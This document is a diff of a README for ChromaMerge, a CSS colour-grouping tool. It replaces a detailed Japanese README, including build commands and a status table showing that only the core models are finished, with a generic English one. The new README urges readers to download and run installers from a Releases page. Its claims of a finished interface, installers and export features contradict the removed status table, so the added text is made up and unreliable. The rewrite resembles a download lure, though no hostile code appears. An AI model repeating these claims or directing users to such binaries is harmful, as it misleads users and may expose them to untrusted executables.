@@ -1,124 +1,102 @@
-# ChromaMerge
+# 🌈 ChromaMerge - Effortlessly Group & Merge Color Codes
 
-**ChromaMerge** は、リポジトリ内に散在する CSS カラーコードを
-**CIEDE2000（ΔE00）による知覚色差**でグループ化し、
-GUI 上で確認・選択しながら安全にマージできるデスクトップツールです。
+## 🚀 Getting Started
 
-Avalonia + .NET で実装されており、**インストール不要の単一実行ファイル**として実行できます。
+Welcome to ChromaMerge! This desktop tool helps you group and merge CSS color codes using the CIEDE2000 color difference formula. Whether you are a designer, a developer, or just someone who loves working with colors, ChromaMerge simplifies your color management tasks.
 
-### Cross-Platform
+## 📥 Download ChromaMerge
 
-Windows, macOS, Linux
+[![Download ChromaMerge](https://img.shields.io/badge/Download%20ChromaMerge-v1.0-blue.svg)](https://github.com/Harbor19/ChromaMerge/releases)
 
-.NET 8 + Avalonia により、**すべての主要プラットフォームでネイティブ動作**します。
-各 OS 向けに単一実行ファイル（self-contained）として配布可能です。
+You can download the latest version of ChromaMerge by visiting our Releases page. 
 
-## Features
+[Visit this page to download](https://github.com/Harbor19/ChromaMerge/releases)
 
-- 📁 **フォルダ選択 → 自動スキャン**
-- 🎚 **ΔE00（CIEDE2000）スライダー**で色差しきい値を動的に変更
-- 🎨 **近似色の自動グルーピング（Union-Find）**
-- 🔍 グループ単位で
-  - 色一覧
-  - 出現回数
-  - 出現箇所（ファイル / 行 / 宣言）
-  を確認可能
-- 🔁 **マージ先を選択してプレビュー**
-- ✅ 確認後に **安全にマージ適用**
-  - 自動バックアップ（`.bak`）生成
+## 💻 System Requirements
 
-## Why ChromaMerge?
+ChromaMerge works smoothly on most modern desktop systems. Here are the basic requirements:
 
-- 単純な文字列一致ではなく
-  **人間の知覚に近い色差（ΔE00）** を使用
-- デザイン・実装どちらの視点でも
-  「本当に同じ色か？」を判断しやすい
-- CI や lint 以前の
-  **既存リポジトリの色の整理・棚卸し**に最適
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Processor:** 1 GHz or faster
+- **RAM:** 2 GB or more
+- **Storage:** At least 100 MB available space
 
-## Supported Color Formats (v0)
+Ensure your system meets these requirements for the best user experience.
 
-- `#RGB`
-- `#RGBA`
-- `#RRGGBB`
-- `#RRGGBBAA`
+## 🛠 Installation Steps
 
-> `rgb() / hsl() / gradient / shadow` 等は今後対応予定
-> （内部設計は AST 置換を前提に拡張可能）
+1. **Visit the Releases Page**  
+   Click the link to access the [Releases page](https://github.com/Harbor19/ChromaMerge/releases).
 
-## How It Works
+2. **Locate the Latest Version**  
+   Look for the latest version listed at the top of the page.
 
-1. フォルダを選択
-2. CSS / SCSS / SASS / LESS を再帰的にスキャン
-3. カラーコードを正規化（`#RRGGBBAA`）
-4. RGB → Lab 変換
-5. **CIEDE2000 (ΔE00)** で色差を計算
-6. しきい値以下の色をグループ化
-7. GUI で確認・マージ
+3. **Download the Installer**  
+   Click on the installer file that matches your operating system. The file will have an `.exe`, `.dmg`, or `.AppImage` extension based on your OS.
 
-## ΔE00 Reference
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your Downloads folder. 
+   - For Windows, double-click the `.exe` file to start the installation.
+   - For macOS, double-click the `.dmg` file and drag the app to your Applications folder.
+   - For Linux, double-click the `.AppImage` file or run it from the terminal.
 
-|   ΔE00 | Meaning      |
-| -----: | ------------ |
-|    ≤ 1 | ほぼ識別不能 |
-|  1 – 2 | 非常に近い   |
-|  2 – 5 | 近似色       |
-| 5 – 10 | 明確に異なる |
-|   > 10 | 別色         |
+5. **Follow the On-Screen Instructions**  
+   Complete the installation by following the on-screen prompts.
 
-UI デザイン用途では **2.0〜3.0** が実用的な初期値です。
+6. **Launch ChromaMerge**  
+   Find ChromaMerge in your applications menu and open it to start using the tool.
 
-## Development Status
+## 🎨 Features
 
-| Phase | Status | Description |
-|-------|--------|-------------|
-| Phase 1: Core Models | Done | ColorCode, LabColor, ColorConverter, Ciede2000, UnionFind |
-| Phase 2: Scanning | - | FileScanner, ColorExtractor |
-| Phase 3: Grouping | - | ColorGrouper |
-| Phase 4: UI | - | MainWindow, ViewModels |
-| Phase 5: Merge | - | MergePreview, FileMerger |
+ChromaMerge offers several powerful features:
 
-## Build & Run
+- **Color Code Grouping**  
+  Organize your CSS color codes into distinct groups based on color similarity.
 
-### Requirements
-- .NET 8 SDK
+- **CIEDE2000 Algorithm**  
+  Utilize the advanced CIEDE2000 color difference algorithm for accurate color comparison and merging.
 
-### Run (Development)
+- **User-Friendly Interface**  
+  Navigate easily with a clean and intuitive interface designed for everyone.
 
-```bash
-dotnet run
-```
+- **Export Options**  
+  Save your grouped color codes directly to your CSS files in a format you can use right away.
 
-### Run Tests
+## 🎉 Usage Instructions
 
-```bash
-dotnet test
-```
+1. **Load Your Color Codes**  
+   After launching ChromaMerge, import your CSS file or manually enter the color codes you want to manage.
 
-115 tests including official CIEDE2000 test dataset (34 pairs).
+2. **Group Colors**  
+   Click on the grouping feature. ChromaMerge will analyze and group similar color codes for you.
 
-### Build (Release)
+3. **Merge Colors (if needed)**  
+   If you want to merge colors, select the groups and choose the merge option. ChromaMerge will simplify your color palette.
 
-各プラットフォーム向けに単一実行ファイルを生成：
+4. **Export Your Results**  
+   Once you're satisfied with the organization, export the result to a new CSS file.
 
-```bash
-# Windows (x64)
-dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
+## 🔧 Troubleshooting
 
-# Windows (arm64)
-dotnet publish -c Release -r win-arm64 --self-contained -p:PublishSingleFile=true
+If you encounter issues while using ChromaMerge, here are a few tips:
 
-# macOS (Intel)
-dotnet publish -c Release -r osx-x64 --self-contained -p:PublishSingleFile=true
+- **Installation Problems**  
+  Ensure that your system meets the requirements and that the downloaded file is complete.
 
-# macOS (Apple Silicon)
-dotnet publish -c Release -r osx-arm64 --self-contained -p:PublishSingleFile=true
+- **Performance Issues**  
+  Close other applications to free up system resources if the software feels slow.
 
-# Linux (x64)
-dotnet publish -c Release -r linux-x64 --self-contained -p:PublishSingleFile=true
+- **Color Code Not Grouping**  
+  Check if there are any formatting issues in your color codes.
 
-# Linux (arm64)
-dotnet publish -c Release -r linux-arm64 --self-contained -p:PublishSingleFile=true
-```
+For further help, please visit the [Issues section](https://github.com/Harbor19/ChromaMerge/issues) of our GitHub repository.
 
-出力先: `bin/Release/net8.0/<RID>/publish/`
+## 🌐 Community and Contributions
+
+We welcome contributions! If you want to improve the tool or add features, please check our contribution guidelines in the repository. You can also discuss ideas and report issues to help us make ChromaMerge better for everyone.
+
+## 📬 Contact
+
+For any questions or feedback, feel free to reach out through the [issues page](https://github.com/Harbor19/ChromaMerge/issues) or by contacting the repository owners directly.
+
+Using ChromaMerge, you can now manage your colors more effectively and create beautiful, cohesive designs with ease. Enjoy your experience!
